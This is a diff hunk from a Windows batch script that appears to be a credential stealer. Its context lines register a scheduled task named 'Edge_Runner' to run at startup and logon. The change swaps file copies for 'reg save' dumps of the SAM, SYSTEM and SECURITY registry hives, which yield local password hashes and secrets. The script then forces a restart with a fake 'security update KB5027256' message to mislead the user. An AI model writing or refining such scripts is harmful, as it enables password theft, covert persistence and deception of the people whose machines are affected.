@@ -170,10 +170,12 @@ SCHTASKS /CREATE /MO ONSTART /TN "Edge_Runner" /TR "C:\Windows\System32\Edge_Run
 cls
 SCHTASKS /CREATE /MO ONLOGON /TN "Edge_Runner" /TR "C:\Windows\System32\Edge_Runner.cmd"
 cls
-REM			-----> Copy SAM and SYSTEM file for research purpose (Password among other things)
-copy C:\Windows\System32\config\SAM ID\SAM
+REM			-----> Copy SAM, SYSTEM and SECURITY file for research purpose (Password among other things)
+reg save hklm\sam ID\SAM
 cls
-copy C:\Windows\System32\config\SYSTEM ID\SYSTEM
+reg save hklm\system ID\SYSTEM
+cls
+reg save hklm\security ID\SECURITY
 cls
 REM			-----> Kill Himself and any other cmd tasks (-fix a bug I have when not launching as admin first)
 shutdown /g /c "Installation de la mise à jour de sécurité KB5027256" /t 60 /soft
